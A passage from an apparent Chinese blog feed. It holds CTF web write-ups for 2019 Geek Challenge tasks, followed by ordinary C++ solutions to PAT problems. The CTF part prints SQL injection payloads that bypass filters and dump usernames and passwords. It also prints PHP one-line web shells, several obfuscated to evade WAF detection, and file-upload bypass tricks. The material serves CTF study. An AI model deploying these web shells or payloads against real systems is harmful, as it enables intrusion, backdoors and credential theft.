title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/wangtanzhi/p/12246386.html">https://www.cnblogs.com/wangtanzhi/p/12246386.html</a></p><p><a href="https://www.cnblogs.com/-chenxs/p/11978488.html">https://www.cnblogs.com/-chenxs/p/11978488.html</a></p><p><a href="https://www.jianshu.com/p/c7768b157df2">https://www.jianshu.com/p/c7768b157df2</a></p><h1 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h1><h2 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h2><p>这道题没啥知识点，就是简单的遇菜刀不决，蚁剑解决</p><p>直接解决</p><p>然后就直接用终端cat flag即可</p><p><img src="2.png"></p><h1 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h1><h2 id="考点-1"><a href="#考点-1" class="headerlink" title="考点"></a>考点</h2><p>难度：水题</p><p>HTTP的一些考点</p><h2 id="解题-2"><a href="#解题-2" class="headerlink" title="解题"></a>解题</h2><p>1.F12-&gt;Secret.php</p><p>2.（提示不是来自<a href="https://www.sycsecret.com)referer的修改/">https://www.Sycsecret.com）Referer的修改</a></p><p>3.（提示用Syclover 浏览器）User-Agent协议来伪造</p><p>4.（提示要本地登录）XFF头进行伪造</p><p>由于太简单了</p><p>此题无…..其他总结</p><h1 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h1><h2 id="考点-2"><a href="#考点-2" class="headerlink" title="考点"></a>考点</h2><p>sql注入之双写绕过</p><p>难度=“低”</p><h2 id="解题-3"><a href="#解题-3" class="headerlink" title="解题"></a>解题</h2><p>1.首先试试万能密码，什么密码都试试fuzz一下</p><p>2.发现union select or from 这几个全部被替换成空了</p><p>3.双写绕过</p><p>4.后面其他的几项也被过滤了</p><p>where imformation 也要双写</p><p>payload如下</p><pre class=" language-sql"><code class="language-sql"><span class="token number">1</span><span class="token punctuation">.</span>admin<span class="token number">1</span>' ununionion seselectlect <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token comment" spellcheck="true">#</span><span class="token number">2</span><span class="token punctuation">.</span>admin<span class="token number">1</span>' ununionion seselectlect <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#   //查看mariadb的version</span><span class="token number">3</span><span class="token punctuation">.</span>admin<span class="token number">1</span>' ununionion seselectlect <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#  //爆库</span><span class="token number">4</span><span class="token punctuation">.</span>admin<span class="token number">1</span>' ununionion seselectlect <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>schema_name<span class="token punctuation">)</span>frfromom <span class="token punctuation">(</span>infoorrmation_schema<span class="token punctuation">.</span>schemata<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#    //爆出所有数据库的名字</span><span class="token number">5</span><span class="token punctuation">.</span>admin<span class="token number">1</span><span class="token string">' ununionion seselectlect 1,2,group_concat(distinct table_name) frfromom infoorrmation_schema.columns whwhereere table_schema = '</span>geek'<span class="token comment" spellcheck="true">#  //爆出geek库的所有表</span><span class="token number">6</span><span class="token punctuation">.</span>admin<span class="token number">1</span><span class="token string">' ununionion seselectlect 1,2,group_concat(distinct column_name) frfromom infoorrmation_schema.columns whwhereere table_name = '</span>b4bsql'<span class="token comment" spellcheck="true">#  //爆出b4sql的所有列</span><span class="token number">7</span><span class="token punctuation">.</span>admin<span class="token number">1</span>' ununionion seselectlect <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>id<span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span>username<span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span>passwoorrd<span class="token punctuation">)</span> frofromm b4bsql<span class="token comment" spellcheck="true"># //爆b4sql的所有字段</span><span class="token number">8</span><span class="token punctuation">.</span>其他查询数据<span class="token number">1</span>'uniunionon selselectect <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>passwoorrd<span class="token punctuation">)</span> frfromom b4bsql<span class="token comment" spellcheck="true">#</span></code></pre><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>我本身对sql注入不是很偏向的，但是这学期上了数据库的课，因为老师很好就觉得还是应该要好好的学学，因此就对这题的一些函数用法还是好好的百（gu）度（ge）一下</p><p><strong>一、concat()函数</strong></p><p>1、功能：将多个字符串连接成一个字符串。</p><p>2、语法：concat(str1, str2,…)</p><p>返回结果为连接参数产生的字符串，如果有任何一个参数为null，则返回值为null。</p><p><strong>二、concat_ws()函数</strong></p><p>1、功能：和concat()一样，将多个字符串连接成一个字符串，但是可以一次性指定分隔符～（concat_ws就是concat with separator）</p><p>2、语法：concat_ws(separator, str1, str2, …)</p><p>说明：第一个参数指定分隔符。需要注意的是分隔符不能为null，如果为null，则返回结果为null。</p><p><strong>三、group_concat()函数</strong></p><p>前言：在有group by的查询语句中，select指定的字段要么就包含在group by语句的后面，作为分组的依据，要么就包含在聚合函数中。</p><p>1、功能：将group by产生的同一个分组中的值连接起来，返回一个字符串结果。</p><p>2、语法：group_concat( [distinct] 要连接的字段 [order by 排序字段 asc/desc ] [separator ‘分隔符’] )</p><p>说明：通过使用distinct可以排除重复值；如果希望对结果中的值进行排序，可以使用order by子句；separator是一个字符串值，缺省为一个逗号。</p><p>其他：</p><p>1.用了group_concat后，select 里如果使用了 limit 是不起作用的</p><p>2.用group_concat连接字段的时候是有长度限制的，并不是有多少连多少。但你可以设置一下。</p><p>3.使用group_concat_max_len系统变量，你可以设置允许的最大长度。</p><p>4.系统默认的分隔符是逗号</p><h2 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.jianshu.com/p/9b2522af7460">https://www.jianshu.com/p/9b2522af7460</a></p><p><a href="https://blog.csdn.net/weixin_43900387/article/details/104919160">https://blog.csdn.net/weixin_43900387/article/details/104919160</a></p><p><a href="https://baijiahao.baidu.com/s?id=1595349117525189591&amp;wfr=spider&amp;for=pc">https://baijiahao.baidu.com/s?id=1595349117525189591&amp;wfr=spider&amp;for=pc</a></p><p><a href="https://www.cnblogs.com/llq1214/p/11202866.html">https://www.cnblogs.com/llq1214/p/11202866.html</a></p><h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><h2 id="考点-3"><a href="#考点-3" class="headerlink" title="考点"></a>考点</h2><p>文件上传绕过之前端js验证、mime检查、黑名单验证</p><h2 id="解题-4"><a href="#解题-4" class="headerlink" title="解题"></a>解题</h2><p>1.得是静态图片</p><p>2.bp改mime类型<strong>Content-Type: image/jpg</strong></p><p>3.后缀修改:php之类的进行fuzz测试，phtml可行</p><p>4.一句话木马的变形</p><p><code>GIF89a &lt;script language="php"&gt;eval($_POST['123']);&lt;/script&gt;</code></p><p>这个地方很迷幻，只有gif图的文件头可以….jpg的不行</p><p>然后进入upload下的该文件</p><p>跟之前那道菜刀题一样，这里不叙述了</p><h2 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h2><p>1.终端是个好用的东西</p><h4 id="文件上传漏洞和绕过"><a href="#文件上传漏洞和绕过" class="headerlink" title="文件上传漏洞和绕过"></a>文件上传漏洞和绕过</h4><p>1.js验证： 禁用js或者用bp抓包修改后缀</p><blockquote><p>更多绕过技巧：</p><p>在一些 webserver 中，存在解析漏洞<br>1.老版本的IIS中的目录解析漏洞，如果网站目录中有一个 /.asp/目录，那么此目录下面的一切内容都会被当作asp脚本来解析<br>2.老板本的IIS中的分号漏洞：IIS在解析文件名的时候可能将分号后面的内容丢弃，那么我们可以在上传的时候给后面加入分号内容来避免黑名单过滤，如 a.asp;jpg<br>3.旧版Windows Server中存在空格和dot漏洞类似于 a.php. 和 a.php[空格] 这样的文件名存储后会被windows去掉点和空格，从而使得加上这两个东西可以突破过滤，成功上传，并且被当作php代码来执行<br>4.nginx空字节漏洞 xxx.jpg%00.php 这样的文件名会被解析为php代码运行<br>5.apache的解析漏洞，上传如a.php.rar a.php.gif 类型的文件名，可以避免对于php文件的过滤机制，但是由于apache在解析文件名的时候是从右向左读，如果遇到不能识别的扩展名则跳过，rar等扩展名是apache不能识别的，因此就会直接将类型识别为php，从而达到了注入php代码的目的</p></blockquote><p>2.MIme类型验证：bp抓包修改Content-type</p><blockquote><p>Content-Type: image/jpg<br>Content-Type: image/png<br>Content-Type: image/jpeg<br>Content-Type: image/gif</p></blockquote><blockquote><p>常用的MIMETYPE表<br>text/plain（纯文本）<br>text/html（HTML文档）<br>text/javascript（js代码）<br>application/xhtml+xml（XHTML文档）<br>image/gif（GIF图像）<br>image/jpeg（JPEG图像）<br>image/png（PNG图像）<br>video/mpeg（MPEG动画）<br>application/octet-stream（二进制数据）<br>application/pdf（PDF文档）<br>application/(编程语言) 该种语言的代码<br>application/msword（Microsoft Word文件）<br>message/rfc822（RFC 822形式）<br>multipart/alternative（HTML邮件的HTML形式和纯文本形式，相同内容使用不同形式表示）<br>application/x-www-form-urlencoded（POST方法提交的表单）<br>multipart/form-data（POST提交时伴随文件上传的表单）</p></blockquote><p>3.黑名单验证：</p><p>（1）fuzz测试：phtml php3 php4 php5 PHP phtm</p><p>前提：httpd.conf配置文件中服务器支持将以上后缀解析为php脚本</p><p>（2）大小写绕过：例如Php，PHp之类的</p><p>但如果有strtolower()将后缀全部变成小写，此方法可抛弃</p><p>4.检查文件内容</p><p>（1）getimagesize()函数</p><p>​            用于获取图像信息</p><p>使用winhex或者010等等在图片后面加上一句话木马即可</p><p>（2）检测关键字</p><p>变换版本的一句话木马</p><p>例如：<code>&lt;script language="php"&gt;eval($_POST['cmd']);&lt;/script&gt;</code>  </p><blockquote><p>幻数的头字节，我们来看一下几种图片文件的幻数：</p><p>（注意！下面是二进制而不是文本格式的数据）</p><p>JPG</p><pre><code>FF D8 FF E0 00 10 4A 46 49 46</code></pre><p>GIF(相当于文本的GIF89a)</p><pre><code>47 49 46 38 39 61</code></pre><p>PNG</p><pre><code>89 50 4E 47</code></pre><p>通过检查头几位字节，可以分辨是否是图片文件</p><p>如果是其他类型的二进制文件，也有响应的头字节，如下表</p><p>格式 文件头<br>TIFF (tif) 49492A00<br>Windows Bitmap (bmp) 424D<br>CAD (dwg) 41433130<br>Adobe Photoshop (psd) 38425053<br>Rich Text Format (rtf) 7B5C727466<br>MS Word/Excel (xls.or.doc) D0CF11E0<br>MS Access (mdb) 5374616E64617264204A<br>ZIP Archive (zip)， 504B0304<br>RAR Archive (rar)， 52617221<br>Wave (wav)， 57415645<br>AVI (avi)， 41564920<br>Real Media (rm)， 2E524D46<br>MPEG (mpg)， 000001BA<br>MPEG (mpg)， 000001B3<br>Quicktime (mov)， 6D6F6F76<br>Adobe Acrobat (pdf)， 255044462D312E<br>Windows Media (asf)， 3026B2758E66CF11<br>MIDI (mid)， 4D546864</p></blockquote><p>5.%00截断–&gt;在bp包里面修改</p><p>主要是nginx的漏洞</p><blockquote><p>Nginx 解析漏洞</p><p>解析- 任意文件名/任意文件名.php | 任意文件名%00.php</p><p>描述- 目前Nginx 主要有这两种漏洞，一个是对任意文件名，在后面添加/任意文件名.php</p><p>的解析漏洞，比如原本文件名是test.jpg，可以添加为test.jpg/x.php进行解析攻击。还有一种是对低版本的Nginx 可以在任意文件名后面添加%00.php 进行解析攻击。</p></blockquote><p>6.</p><p>.htaccess上传</p><pre><code>&lt;FilesMatch "shell.jpg"&gt;  SetHandler application/x-httpd-php&lt;/FilesMatch&gt;</code></pre><p>.user.ini上传</p><pre><code>GIF89aauto_prepend_file=a.jpg</code></pre><p>–&gt;2020年de1ctf的一道web签到题</p><h3 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h3><blockquote><p>一句话木马就是只需要一行代码的木马，短短一行代码，就能做到和大马相当的功能。为了绕过waf的检测，一句话木马出现了无数中变形，但本质是不变的：木马的函数执行了我们发送的命令。</p></blockquote><pre><code>&lt;?php eval(@$_POST['a']); ?&gt;</code></pre><p>到PHP5之后的assert函数被修改了，不常用了</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">assert</span><span class="token punctuation">(</span>@<span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span></code></pre><h5 id="create-function函数"><a href="#create-function函数" class="headerlink" title="create_function函数"></a>create_function函数</h5><pre class=" language-kotlin"><code class="language-kotlin"><span class="token operator">&lt;</span><span class="token operator">?</span>php $<span class="token keyword">fun</span> <span class="token operator">=</span> <span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span>$_POST<span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>$<span class="token keyword">fun</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span><span class="token operator">></span></code></pre><p>把用户传递的数据生成一个函数fun()，然后再执行fun()</p><h5 id="PHP可变变量"><a href="#PHP可变变量" class="headerlink" title="PHP可变变量"></a>PHP可变变量</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$bb</span><span class="token operator">=</span><span class="token string">"eval"</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token string">"bb"</span><span class="token punctuation">;</span>$<span class="token variable">$aa</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><h5 id="str-replace函数"><a href="#str-replace函数" class="headerlink" title="str_replace函数"></a>str_replace函数</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"Waldo"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"eWaldoval"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token punctuation">(</span>@<span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>函数功能：在第三个参数中，查找第一个参数，并替换成第二个参数。这里第二个参数为空字符串，就相当于删除”Waldo”。</p><h5 id="base64-decode函数"><a href="#base64-decode函数" class="headerlink" title="base64_decode函数"></a>base64_decode函数</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token string">"ZXZhbA=="</span><span class="token punctuation">)</span><span class="token variable">$a</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>这里是base64解密函数，”ZXZhbA==”是eval的base64加密。</p><h5 id="“-”操作符"><a href="#“-”操作符" class="headerlink" title="“.”操作符"></a>“.”操作符</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token string">"e"</span><span class="token punctuation">.</span><span class="token string">"v"</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token string">"a"</span><span class="token punctuation">.</span><span class="token string">"l"</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$a</span><span class="token punctuation">.</span><span class="token variable">$b</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><h5 id="parse-str函数"><a href="#parse-str函数" class="headerlink" title="parse_str函数"></a>parse_str函数</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$str</span><span class="token operator">=</span><span class="token string">"a=eval"</span><span class="token punctuation">;</span><span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>执行这个函数后，生成一个变量$a，值为字符串”eval”</p><p>其他：</p><pre class=" language-kotlin"><code class="language-kotlin"><span class="token operator">&lt;</span><span class="token operator">?</span>phpfunction <span class="token keyword">fun</span><span class="token punctuation">(</span><span class="token punctuation">)</span>&amp;#<span class="token number">123</span><span class="token punctuation">;</span><span class="token keyword">return</span> $_POST<span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>&amp;#<span class="token number">125</span><span class="token punctuation">;</span><span class="token label symbol">@preg_replace</span><span class="token punctuation">(</span><span class="token string">"/test/e"</span><span class="token punctuation">,</span><span class="token keyword">fun</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"test test test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span><span class="token operator">></span></code></pre><p>创建函数 fun()，返回post中“a”的数据（安全狗却扫不出，D盾也是）</p><p>以及其他函数化用</p><blockquote><pre><code>实战+谷歌` 上述六种技巧每一种单独使用都不能绕过waf，但是与 第三大点提到的函数混合起来使用，就可以顺利的欺骗waf。 tips：使用一句话木马的时候可以在函数前加”@”符，这个符号让php语句不显示错误信息，增加隐蔽性。</code></pre></blockquote><h2 id="参考-2"><a href="#参考-2" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/weixin_30566063/article/details/99558838">https://blog.csdn.net/weixin_30566063/article/details/99558838</a></p><p><a href="https://xi4or0uji.github.io/2019/07/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B1%87%E6%80%BB/">https://xi4or0uji.github.io/2019/07/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B1%87%E6%80%BB/</a></p><p><a href="https://www.jianshu.com/p/90473b8e6667">https://www.jianshu.com/p/90473b8e6667</a></p><p><a href="https://blog.csdn.net/Wu000999/article/details/101796673">https://blog.csdn.net/Wu000999/article/details/101796673</a></p><p><a href="https://www.webshell.cc/2265.html">https://www.webshell.cc/2265.html</a></p><p><a href="https://www.cnblogs.com/-wenli/p/9911556.html">https://www.cnblogs.com/-wenli/p/9911556.html</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF-WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PAT甲级1006</title>
      <link href="/2020/07/24/pat-jia-ji-1006/"/>
      <url>/2020/07/24/pat-jia-ji-1006/</url>
      
        <content type="html"><![CDATA[<blockquote><p>太真实了，这道题估计是我自己写的最 舒服的一道题了吧，555</p></blockquote><h1 id="1006-Sign-In-and-Sign-Out-25分"><a href="#1006-Sign-In-and-Sign-Out-25分" class="headerlink" title="1006 Sign In and Sign Out (25分)"></a>1006 Sign In and Sign Out (25分)</h1><p>At the beginning of every day, the first person who signs in the computer room will unlock the door, and the last one who signs out will lock the door. Given the records of signing in’s and out’s, you are supposed to find the ones who have unlocked and locked the door on that day.</p><h3 id="Input-Specification"><a href="#Input-Specification" class="headerlink" title="Input Specification:"></a>Input Specification:</h3><p>Each input file contains one test case. Each case contains the records for one day. The case starts with a positive integer <em>M</em>, which is the total number of records, followed by <em>M</em> lines, each in the format:</p><pre><code>ID_number Sign_in_time Sign_out_time</code></pre><p>where times are given in the format <code>HH:MM:SS</code>, and <code>ID_number</code> is a string with no more than 15 characters.</p><a id="more"></a><h3 id="Output-Specification"><a href="#Output-Specification" class="headerlink" title="Output Specification:"></a>Output Specification:</h3><p>For each test case, output in one line the ID numbers of the persons who have unlocked and locked the door on that day. The two ID numbers must be separated by one space.</p><p>Note: It is guaranteed that the records are consistent. That is, the sign in time must be earlier than the sign out time for each person, and there are no two persons sign in or out at the same moment.</p><h3 id="Sample-Input"><a href="#Sample-Input" class="headerlink" title="Sample Input:"></a>Sample Input:</h3><pre class=" language-in"><code class="language-in">3CS301111 15:30:28 17:00:10SC3021234 08:00:00 11:25:25CS301133 21:45:00 21:58:40</code></pre><h3 id="Sample-Output"><a href="#Sample-Output" class="headerlink" title="Sample Output:"></a>Sample Output:</h3><pre class=" language-out"><code class="language-out">SC3021234 CS301133</code></pre><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h4 id="难度："><a href="#难度：" class="headerlink" title="难度："></a>难度：</h4><p>签到题</p><h3 id="题意："><a href="#题意：" class="headerlink" title="题意："></a>题意：</h3><p>1.输入来了几个人</p><p>2.输入id号，来的时间，走的时间</p><p>3.输出最早来的和最晚走的</p><p>输入：</p><p>1.int n</p><p>2.字符串输入id号、来的时间和走的时间</p><p>输出：</p><p>输出最早来的和最晚走的</p><h3 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h3><p>1.循环输入n次</p><p>2.比较大小，最小的和最大的</p><p>代码如下：</p><pre class=" language-c++"><code class="language-c++">#include<iostream>using namespace std;int main()&#123;    int n;    cin >> n;    string minid = "" ;    string maxid = "" ;    string mintime = "23:59:59";    string maxtime = "00:00:00";    for(int i=0 ; i < n; i++)&#123;        string id, begin,end;        cin >> id >> begin >> end;        if(begin < mintime)&#123;            mintime = begin;            minid = id;        &#125;        if(end > maxtime)&#123;            maxtime = end;            maxid = id;        &#125;    &#125;    cout << minid <<" " << maxid <<endl;return 0;&#125;</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> PAT </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PAT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PAT甲级1005</title>
      <link href="/2020/07/23/pat-jia-ji-1005/"/>
      <url>/2020/07/23/pat-jia-ji-1005/</url>
      
        <content type="html"><![CDATA[<blockquote><p>先发第五题，第三题做出来了，还在写分析，加油哦！</p></blockquote><h1 id="1005-Spell-It-Right-20分"><a href="#1005-Spell-It-Right-20分" class="headerlink" title="1005 Spell It Right (20分)"></a>1005 Spell It Right (20分)</h1><p>Given a non-negative integer <em>N</em>, your task is to compute the sum of all the digits of <em>N</em>, and output every digit of the sum in English.</p><h3 id="Input-Specification"><a href="#Input-Specification" class="headerlink" title="Input Specification:"></a>Input Specification:</h3><p>Each input file contains one test case. Each case occupies one line which contains an <em>N</em> (≤10100).</p><h3 id="Output-Specification"><a href="#Output-Specification" class="headerlink" title="Output Specification:"></a>Output Specification:</h3><p>For each test case, output in one line the digits of the sum in English words. There must be one space between two consecutive words, but no extra space at the end of a line.</p><a id="more"></a><h3 id="Sample-Input"><a href="#Sample-Input" class="headerlink" title="Sample Input:"></a>Sample Input:</h3><pre class=" language-in"><code class="language-in">12345</code></pre><h3 id="Sample-Output"><a href="#Sample-Output" class="headerlink" title="Sample Output:"></a>Sample Output:</h3><pre class=" language-out"><code class="language-out">one five</code></pre><p>原题如上</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h4 id="难度："><a href="#难度：" class="headerlink" title="难度："></a>难度：</h4><p>签到题</p><h3 id="题意："><a href="#题意：" class="headerlink" title="题意："></a>题意：</h3><p>输入一个数字（10的100次方以内）然后计算其中所有的数字之和接着把所得之和用英语按位输出（0-9）</p><p>输入：</p><p>那么只能用字符串型存入输入的数字（int没那么大）</p><p>输出：</p><p>用字符串匹配，按照数组，一个一个输出英文字符</p><h3 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h3><p>1.输入是字符串，string类型最佳</p><p>2.计算总和时，将字符串转换成int型</p><p>3.再将int型转换成字符串，与所存数组匹配，从前往后输出</p><p>代码如下：</p><pre class=" language-c++"><code class="language-c++">#include<iostream>#include<cstring>#include<cstdio>#include<vector> using namespace std;int main()&#123;    int sum = 0;    string num[10] = &#123; "zero", "one", "two", "three","four", "five", "six", "seven","eight", "nine" &#125;;    string str;    cin >> str;    int t = str.length();    for(int i= 0; i < t; i++ )&#123;        sum += (str[i] - '0');     &#125;    string s = to_string(sum);    int len = s.length();    for(int i=0; i < len; i++)&#123;        if(i < len-1)&#123;        cout << num[s[i] - '0'] << " ";        &#125;        else&#123;            cout << num[s[i]-'0'];        &#125;    &#125;    return 0;&#125; </code></pre><p>今天也要加油啊！</p><p>参考：</p><p><a href="https://blog.csdn.net/Line290/article/details/52865596">https://blog.csdn.net/Line290/article/details/52865596</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> PAT </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PAT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PAT甲级1003</title>
      <link href="/2020/07/17/pat-jia-ji-1003/"/>
      <url>/2020/07/17/pat-jia-ji-1003/</url>
      
        <content type="html"><![CDATA[<blockquote><p>刷题第三弹，自己努力搞定吧，别到时候丢人啊！</p><p>虽然说现在更新的是PAT，但后面会陆陆续续地更新CTF的东西</p></blockquote><h1 id="1003-Emergency-25分"><a href="#1003-Emergency-25分" class="headerlink" title="1003 Emergency (25分)"></a><strong>1003</strong> <strong>Emergency</strong> (25分)</h1><p>As an emergency rescue team leader of a city, you are given a special map of your country. The map shows several scattered cities connected by some roads. Amount of rescue teams in each city and the length of each road between any pair of cities are marked on the map. When there is an emergency call to you from some other city, your job is to lead your men to the place as quickly as possible, and at the mean time, call up as many hands on the way as possible.</p><a id="more"></a><h3 id="Input-Specification"><a href="#Input-Specification" class="headerlink" title="Input Specification:"></a>Input Specification:</h3><p>Each input file contains one test case. For each test case, the first line contains 4 positive integers: <em>N</em> (≤500) - the number of cities (and the cities are numbered from 0 to <em>N</em>−1), <em>M</em> - the number of roads, <em>C</em>1 and <em>C</em>2 - the cities that you are currently in and that you must save, respectively. The next line contains <em>N</em> integers, where the <em>i</em>-th integer is the number of rescue teams in the <em>i</em>-th city. Then <em>M</em> lines follow, each describes a road with three integers <em>c</em>1, <em>c</em>2 and <em>L</em>, which are the pair of cities connected by a road and the length of that road, respectively. It is guaranteed that there exists at least one path from <em>C</em>1 to <em>C</em>2.</p><h3 id="Output-Specification"><a href="#Output-Specification" class="headerlink" title="Output Specification:"></a>Output Specification:</h3><p>For each test case, print in one line two numbers: the number of different shortest paths between <em>C</em>1 and <em>C</em>2, and the maximum amount of rescue teams you can possibly gather. All the numbers in a line must be separated by exactly one space, and there is no extra space allowed at the end of a line.</p><h3 id="Sample-Input"><a href="#Sample-Input" class="headerlink" title="Sample Input:"></a>Sample Input:</h3><pre class=" language-in"><code class="language-in">5 6 0 21 2 1 5 30 1 10 2 20 3 11 2 12 4 13 4 1</code></pre><h3 id="Sample-Output"><a href="#Sample-Output" class="headerlink" title="Sample Output:"></a>Sample Output:</h3><pre class=" language-out"><code class="language-out">2 4</code></pre><p>原题如上</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="题意："><a href="#题意：" class="headerlink" title="题意："></a>题意：</h3><p>有N个城市，其中有m条路构成了图，其中每个城市有大小不同的救援队。其中你在c1，当c2城市发生险情的时候，你需要带领你的救援队火速从最短路径赶往c2城市，其中你所经过的城市的救援队也会加入你的救援队。</p><p>输入：</p><p>第一行：城市数、路径数、你所在的城市、需要救援的城市</p><p>第二行：每个城市所驻扎的救援队的数目</p><p>后面n（路径数）行：该条路的起点、终点、长度</p><p>输出：</p><p>最短路径数目以及这些路径中集合后的最大救援队数目</p><h3 